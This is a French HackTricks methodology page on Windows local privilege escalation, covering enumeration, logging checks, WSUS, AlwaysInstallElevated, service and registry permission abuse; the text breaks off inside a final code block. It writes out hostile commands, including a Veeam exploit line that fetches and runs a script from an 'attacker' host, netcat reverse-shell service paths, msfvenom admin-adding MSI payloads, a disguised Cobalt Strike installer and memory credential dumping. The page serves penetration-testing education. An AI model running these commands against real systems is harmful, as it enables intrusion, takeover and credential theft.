# Élévation de privilèges locale Windows

{{#include ../../banners/hacktricks-training.md}}

### **Meilleur outil pour rechercher les vecteurs d’élévation de privilèges locale Windows :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Théorie initiale de Windows

### Access Tokens

**Si vous ne savez pas ce que sont les Windows Access Tokens, consultez la page suivante avant de continuer :**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consultez la page suivante pour plus d’informations sur les ACLs - DACLs/SACLs/ACEs :**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Niveaux d’intégrité

**Si vous ne savez pas ce que sont les niveaux d’intégrité dans Windows, consultez la page suivante avant de continuer :**


{{#ref}}
integrity-levels.md
{{#endref}}

## Contrôles de sécurité Windows

Il existe différents éléments dans Windows qui pourraient **vous empêcher d’énumérer le système**, d’exécuter des exécutables ou même de **détecter vos activités**. Vous devez **lire** la **page** suivante et **énumérer** tous ces **mécanismes** de **défense** avant de commencer l’énumération pour l’élévation de privilèges :


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Protection de l’administrateur / élévation silencieuse UIAccess

Les processus UIAccess lancés via `RAiLaunchAdminProcess` peuvent être détournés pour atteindre un niveau d’intégrité élevé sans invite lorsque les vérifications de chemin sécurisé d’AppInfo sont contournées. Consultez le workflow dédié au contournement de UIAccess/Admin Protection ici :

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagation du registre d’accessibilité de Secure Desktop peut être détournée pour effectuer une écriture arbitraire dans le registre en tant que SYSTEM (RegPwn) :

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Les versions récentes de Windows ont également introduit une voie d’élévation de privilèges locale **SMB arbitrary-port**, où une authentification NTLM locale privilégiée est réfléchie via une connexion TCP SMB réutilisée :

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informations système

### Énumération des informations de version

Vérifiez si la version de Windows présente une vulnérabilité connue (vérifiez également les correctifs appliqués).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits de version

Ce [site](https://msrc.microsoft.com/update-guide/vulnerability) est pratique pour rechercher des informations détaillées sur les vulnérabilités de sécurité Microsoft. Cette base de données contient plus de 4 700 vulnérabilités de sécurité, illustrant la **surface d'attaque massive** que représente un environnement Windows.

**Sur le système**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas intègre watson)_

**Localement avec les informations système**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Dépôts Github d'exploits :**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environnement

Des identifiants ou des informations Juicy sont-ils enregistrés dans les variables d'environnement ?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historique PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Fichiers de transcription PowerShell

Vous pouvez apprendre comment activer cette fonctionnalité sur [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Les détails des exécutions du pipeline PowerShell sont enregistrés, notamment les commandes exécutées, les invocations de commandes et certaines parties des scripts. Cependant, les détails complets de l’exécution et les résultats de sortie peuvent ne pas être capturés.

Pour activer cette fonctionnalité, suivez les instructions de la section « Transcript files » de la documentation, en sélectionnant **« Module Logging »** au lieu de **« Powershell Transcription »**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Pour afficher les 15 derniers événements des journaux PowerShell, vous pouvez exécuter :
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Un enregistrement complet de l’activité et du contenu intégral de l’exécution du script est capturé, garantissant que chaque bloc de code est documenté au fur et à mesure de son exécution. Ce processus conserve une piste d’audit exhaustive de chaque activité, utile pour la forensique et l’analyse des comportements malveillants. En documentant toute l’activité au moment de son exécution, il fournit des informations détaillées sur le processus.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Les événements de journalisation pour le Script Block se trouvent dans l’Observateur d’événements Windows, à l’emplacement suivant : **Journaux des applications et des services > Microsoft > Windows > PowerShell > Opérationnel**.\
Pour afficher les 20 derniers événements, vous pouvez utiliser :
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Paramètres Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Disques
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Vous pouvez compromettre le système si les mises à jour ne sont pas demandées via http**S**, mais via http.

Commencez par vérifier si le réseau utilise une mise à jour WSUS non-SSL en exécutant la commande suivante dans cmd :
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ou ce qui suit dans PowerShell :
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si vous obtenez une réponse comme l'une de celles-ci :
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Et si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` est égal à `1`.

Alors, **c'est exploitable.** Si la dernière valeur de registre est égale à `0`, l'entrée WSUS sera ignorée.

Pour exploiter ces vulnérabilités, vous pouvez utiliser des outils tels que : [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Il s'agit de scripts d'exploits MiTM weaponized permettant d'injecter de « fausses » mises à jour dans le trafic WSUS non-SSL.

Lisez la recherche ici :

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lisez le rapport complet ici**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
En substance, voici la faille exploitée par ce bug :

> Si nous avons la possibilité de modifier le proxy de notre utilisateur local et que Windows Updates utilise le proxy configuré dans les paramètres d'Internet Explorer, nous pouvons donc exécuter [PyWSUS](https://github.com/GoSecure/pywsus) localement afin d'intercepter notre propre trafic et d'exécuter du code en tant qu'utilisateur privilégié sur notre machine.
>
> De plus, puisque le service WSUS utilise les paramètres de l'utilisateur courant, il utilisera également son magasin de certificats. Si nous générons un certificat auto-signé pour le hostname WSUS et ajoutons ce certificat au magasin de certificats de l'utilisateur courant, nous pourrons intercepter le trafic WSUS HTTP et HTTPS. WSUS n'utilise aucun mécanisme de type HSTS pour implémenter une validation de type trust-on-first-use du certificat. Si le certificat présenté est approuvé par l'utilisateur et possède le hostname correct, il sera accepté par le service.

Vous pouvez exploiter cette vulnérabilité à l'aide de l'outil [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (une fois qu'il sera libéré).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

De nombreux agents d'entreprise exposent une surface IPC localhost ainsi qu'un canal de mise à jour privilégié. Si l'inscription peut être forcée vers un serveur contrôlé par l'attaquant et que l'updater fait confiance à une rogue root CA ou à de faibles vérifications de signature, un utilisateur local peut fournir un MSI malveillant que le service SYSTEM installe. Consultez une technique généralisée (basée sur la chaîne Netskope stAgentSvc – CVE-2025-0309) ici :


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` expose un service localhost sur **TCP/9401** qui traite des messages contrôlés par l'attaquant, permettant l'exécution de commandes arbitraires en tant que **NT AUTHORITY\SYSTEM**.

- **Recon** : confirmez le listener et la version, par exemple avec `netstat -ano | findstr 9401` et `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit** : placez un PoC tel que `VeeamHax.exe` avec les DLL Veeam requises dans le même répertoire, puis déclenchez un payload SYSTEM via le socket local :
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Le service exécute la commande en tant que SYSTEM.
## KrbRelayUp

Une vulnérabilité d'**élévation de privilèges locale** existe dans les environnements Windows **de domaine** sous certaines conditions. Ces conditions incluent les environnements où la **signature LDAP n'est pas appliquée**, où les utilisateurs disposent de droits leur permettant de configurer la **Resource-Based Constrained Delegation (RBCD)**, ainsi que la possibilité pour les utilisateurs de créer des ordinateurs au sein du domaine. Il est important de noter que ces **prérequis** sont satisfaits avec les paramètres par défaut.

Trouvez l'**exploit dans** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Pour plus d'informations sur le déroulement de l'attaque, consultez [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** ces 2 clés de registre sont **activées** (valeur **0x1**), les utilisateurs disposant de n'importe quel niveau de privilège peuvent **installer** (exécuter) des fichiers `*.msi` en tant que NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si vous avez une session meterpreter, vous pouvez automatiser cette technique à l’aide du module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Utilisez la commande `Write-UserAddMSI` de power-up pour créer dans le répertoire actuel un binaire MSI Windows afin d’escalader les privilèges. Ce script génère un installateur MSI précompilé qui demande l’ajout d’un utilisateur/groupe (vous aurez donc besoin d’un accès GIU) :
```
Write-UserAddMSI
```
Exécutez simplement le binaire créé pour élever les privilèges.

### MSI Wrapper

Lisez ce tutoriel pour apprendre à créer un MSI Wrapper à l'aide de ces outils. Notez que vous pouvez encapsuler un fichier "**.bat**" si vous voulez **simplement exécuter** des **lignes de commande**.

{{#ref}}
msi-wrapper.md
{{#endref}}

### Créer un MSI avec WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Créer un MSI avec Visual Studio

- **Générez** avec Cobalt Strike ou Metasploit un **nouveau payload TCP Windows EXE** dans `C:\privesc\beacon.exe`
- Ouvrez **Visual Studio**, sélectionnez **Create a new project** et saisissez « installer » dans la zone de recherche. Sélectionnez le projet **Setup Wizard** et cliquez sur **Next**.
- Donnez un nom au projet, par exemple **AlwaysPrivesc**, utilisez **`C:\privesc`** comme emplacement, sélectionnez **place solution and project in the same directory**, puis cliquez sur **Create**.
- Cliquez sur **Next** jusqu'à atteindre l'étape 3 sur 4 (choix des fichiers à inclure). Cliquez sur **Add** et sélectionnez le payload Beacon que vous venez de générer. Cliquez ensuite sur **Finish**.
- Sélectionnez le projet **AlwaysPrivesc** dans **Solution Explorer** et, dans les **Properties**, remplacez **TargetPlatform** de **x86** par **x64**.
- Vous pouvez modifier d'autres propriétés, telles que **Author** et **Manufacturer**, afin de donner à l'application installée une apparence plus légitime.
- Faites un clic droit sur le projet et sélectionnez **View > Custom Actions**.
- Faites un clic droit sur **Install** et sélectionnez **Add Custom Action**.
- Double-cliquez sur **Application Folder**, sélectionnez votre fichier **beacon.exe**, puis cliquez sur **OK**. Cela garantit que le payload Beacon est exécuté dès que l'installer est lancé.
- Dans les **Custom Action Properties**, définissez **Run64Bit** sur **True**.
- Enfin, **compilez-le**.
- Si l'avertissement `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` s'affiche, vérifiez que la plateforme est définie sur x64.

### Installation du MSI

Pour exécuter l'**installation** du fichier `.msi` malveillant **en arrière-plan** :
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Pour exploiter cette vulnérabilité, vous pouvez utiliser : _exploit/windows/local/always_install_elevated_

## Antivirus et détecteurs

### Paramètres d’audit

Ces paramètres déterminent ce qui est **journalisé**, vous devez donc y prêter attention
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, il est intéressant de savoir vers où sont envoyés les logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** est conçu pour la **gestion des mots de passe des comptes Administrateur locaux**, en veillant à ce que chaque mot de passe soit **unique, aléatoire et régulièrement mis à jour** sur les ordinateurs joints à un domaine. Ces mots de passe sont stockés de manière sécurisée dans Active Directory et ne peuvent être consultés que par les utilisateurs ayant obtenu les autorisations suffisantes via les ACLs, leur permettant d'afficher les mots de passe des administrateurs locaux s'ils y sont autorisés.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Lorsqu'il est actif, les **mots de passe en clair sont stockés dans LSASS** (Local Security Authority Subsystem Service).\
[**Plus d'informations sur WDigest sur cette page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Protection de LSA

À partir de **Windows 8.1**, Microsoft a introduit une protection renforcée pour la Local Security Authority (LSA) afin de **bloquer** les tentatives des processus non approuvés de **lire sa mémoire** ou d’y injecter du code, renforçant ainsi la sécurité du système.\
[**Plus d’informations sur la protection de LSA ici**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** a été introduit dans **Windows 10**. Son objectif est de protéger les identifiants stockés sur un appareil contre des menaces telles que les attaques **pass-the-hash**.| [**Plus d’informations sur Credentials Guard ici.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Identifiants mis en cache

Les **identifiants de domaine** sont authentifiés par la **Local Security Authority** (LSA) et utilisés par les composants du système d’exploitation. Lorsque les données de connexion d’un utilisateur sont authentifiées par un package de sécurité enregistré, les identifiants de domaine de cet utilisateur sont généralement établis.\
[**Plus d’informations sur les identifiants mis en cache ici**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utilisateurs et groupes

### Énumérer les utilisateurs et les groupes

Vous devriez vérifier si certains des groupes auxquels vous appartenez disposent d’autorisations intéressantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Groupes privilégiés

Si vous **appartenez à un groupe privilégié, vous pourrez peut-être élever vos privilèges**. Découvrez les groupes privilégiés et comment les exploiter pour élever vos privilèges ici :


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulation de tokens

**Découvrez-en davantage** sur ce qu'est un **token** sur cette page : [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consultez la page suivante pour **en savoir plus sur les tokens intéressants** et découvrir comment les exploiter :


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utilisateurs connectés / Sessions
```bash
qwinsta
klist sessions
```
### Dossiers personnels
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politique de mots de passe
```bash
net accounts
```
### Obtenir le contenu du presse-papiers
```bash
powershell -command "Get-Clipboard"
```
## Processus en cours d’exécution

### Permissions des fichiers et dossiers

Tout d’abord, lors de l’énumération des processus, **vérifiez la présence de mots de passe dans la ligne de commande du processus**.\
Vérifiez si vous pouvez **écraser un binaire en cours d’exécution** ou si vous disposez des permissions d’écriture sur le dossier du binaire afin d’exploiter d’éventuelles [**DLL Hijacking attacks**](dll-hijacking/index.html) :
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Vérifiez toujours si des [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) sont en cours d’exécution, vous pourriez les exploiter pour élever vos privilèges.

**Vérification des permissions des binaires des processus**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Vérification des permissions des dossiers des binaires des processus (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Extraction de mots de passe en mémoire

Vous pouvez créer un dump mémoire d’un processus en cours d’exécution à l’aide de **procdump** de Sysinternals. Les services comme FTP ont les **identifiants en clair en mémoire** ; essayez de dumper la mémoire et de lire les identifiants.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applications GUI non sécurisées

**Les applications s’exécutant en tant que SYSTEM peuvent permettre à un utilisateur de lancer un CMD ou de parcourir des répertoires.**

Exemple : « Windows Help and Support » (Windows + F1), recherchez « command prompt », puis cliquez sur « Click to open Command Prompt »

## Services

Les Service Triggers permettent à Windows de démarrer un service lorsque certaines conditions sont réunies (activité sur un named pipe/endpoint RPC, événements ETW, disponibilité d’une adresse IP, connexion d’un périphérique, actualisation des GPO, etc.). Même sans les droits SERVICE_START, vous pouvez souvent démarrer des services privilégiés en déclenchant leurs triggers. Consultez les techniques d’enumeration et d’activation ici :

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtenir une liste des services :
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Autorisations

Vous pouvez utiliser **sc** pour obtenir des informations sur un service
```bash
sc qc <service_name>
```
Il est recommandé d'avoir le binaire **accesschk** de _Sysinternals_ pour vérifier le niveau de privilèges requis pour chaque service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Il est recommandé de vérifier si « Authenticated Users » peut modifier un service quelconque :
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Vous pouvez télécharger accesschk.exe pour XP ici](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Activer le service

Si vous rencontrez cette erreur (par exemple avec SSDPSRV) :

_Une erreur système 1058 s’est produite._\
_Le service ne peut pas être démarré, soit parce qu’il est désactivé, soit parce qu’aucun périphérique activé ne lui est associé._

Vous pouvez l’activer en utilisant
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tenez compte du fait que le service upnphost dépend de SSDPSRV pour fonctionner (pour XP SP1)**

**Une autre solution de contournement** à ce problème consiste à exécuter :
```
sc.exe config usosvc start= auto
```
### **Modifier le chemin du binaire du service**

Dans le scénario où le groupe « Authenticated users » possède **SERVICE_ALL_ACCESS** sur un service, il est possible de modifier le binaire exécutable du service. Pour modifier et exécuter **sc** :
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Redémarrer le service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Les privilèges peuvent être escaladés grâce à diverses permissions :

- **SERVICE_CHANGE_CONFIG** : Permet de reconfigurer le binaire du service.
- **WRITE_DAC** : Permet de reconfigurer les permissions, ce qui permet ensuite de modifier la configuration du service.
- **WRITE_OWNER** : Permet d'acquérir la propriété et de reconfigurer les permissions.
- **GENERIC_WRITE** : Hérite de la capacité à modifier la configuration du service.
- **GENERIC_ALL** : Hérite également de la capacité à modifier la configuration du service.

Pour détecter et exploiter cette vulnérabilité, _exploit/windows/local/service_permissions_ peut être utilisé.

### Permissions faibles des binaires de services

Si un service s'exécute en tant que **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ou avec un compte de domaine privilégié, mais que des utilisateurs disposant de faibles privilèges peuvent modifier l'EXE du service ou son dossier parent, le service peut souvent être détourné en **remplaçant le binaire et en redémarrant le service**.

**Vérifiez si vous pouvez modifier le binaire exécuté par un service** ou si vous disposez de **permissions d'écriture sur le dossier** où se trouve le binaire ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Vous pouvez obtenir tous les binaires exécutés par un service avec **wmic** (hors de system32) et vérifier vos permissions avec **icacls** :
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Vous pouvez également utiliser **sc** et **icacls** :
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Recherchez les ACL dangereuses accordées à **`Everyone`**, **`BUILTIN\Users`** ou **`Authenticated Users`**, en particulier **`(F)`**, **`(M)`** ou **`(W)`** sur l’exécutable du service ou sur le répertoire qui le contient. Un scénario d’abus pratique est le suivant :

1. Confirmez le compte du service et le chemin de l’exécutable avec `sc qc <service_name>`.
2. Confirmez que le binaire est accessible en écriture avec `icacls <path>`.
3. Remplacez le binaire du service par un payload ou par un binaire de service malveillant valide.
4. Redémarrez le service avec `sc stop <service_name> && sc start <service_name>` (ou attendez un redémarrage / un déclencheur de service).

Vérifications automatisées utiles :
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Si le service n’autorise pas un utilisateur standard à le redémarrer, vérifiez s’il démarre automatiquement au démarrage, s’il possède une action en cas d’échec qui le relance ou s’il peut être déclenché indirectement par l’application qui l’utilise.

### Permissions de modification du registre des services

Vous devez vérifier si vous pouvez modifier un registre de services.\
Vous pouvez **vérifier** vos **permissions** sur un **registre** de service en exécutant :
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Il convient de vérifier si **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** disposent des autorisations `FullControl`. Si c’est le cas, le binaire exécuté par le service peut être modifié.

Pour modifier le chemin du binaire exécuté :
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Certain Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect this privileged write to **any HKLM path**, providing an arbitrary **HKLM value write** primitive.

Key locations (example: **On-Screen Keyboard** `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` répertorie les fonctionnalités d'accessibilité installées.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stocke la configuration contrôlée par l'utilisateur.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` est créé lors de la connexion ou des transitions vers le secure desktop et est accessible en écriture par l'utilisateur.

Abuse flow (CVE-2026-24291 / ATConfig) :

1. Remplir la valeur **HKCU ATConfig** que vous souhaitez faire écrire par SYSTEM.
2. Déclencher la copie vers le secure desktop (par exemple avec **LockWorkstation**), ce qui démarre le flux AT broker.
3. **Gagner la race** en plaçant un **oplock** sur `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` ; lorsque l'oplock se déclenche, remplacer la clé **HKLM Session ATConfig** par un **registry link** vers une cible HKLM protégée.
4. SYSTEM écrit la valeur choisie par l'attaquant vers le chemin HKLM redirigé.

Une fois l'arbitrary HKLM value write obtenue, effectuer un pivot vers la LPE en écrasant les valeurs de configuration d'un service :

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Choisir un service qu'un utilisateur normal peut démarrer (par exemple **`msiserver`**) et le déclencher après l'écriture. **Note :** l'implémentation publique de l'exploit **verrouille la workstation** dans le cadre de la race.

Example tooling (RegPwn BOF / standalone) :
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
